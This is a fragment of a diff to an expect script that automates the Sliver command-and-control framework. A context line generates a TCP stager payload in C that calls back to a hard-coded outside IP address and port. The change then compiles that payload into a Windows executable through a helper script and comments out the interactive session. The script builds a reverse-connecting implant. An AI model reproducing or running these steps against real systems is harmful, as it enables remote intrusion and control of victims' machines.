@@ -45,7 +45,7 @@ send "jobs\r"
 send "generate stager --lhost 18.143.102.216 --lport 1234 --protocol tcp --arch amd64 --format c --save $payload_c\r"
 
 # create .exe file from another .sh file
-./tools/sliver/exe_from_c.sh
+exec ./tools/sliver/exe_from_c.sh
 
-# Enter interactive mode, allowing you to manually interact with sliver-server
-interact
+# # Enter interactive mode, allowing you to manually interact with sliver-server
+# interact
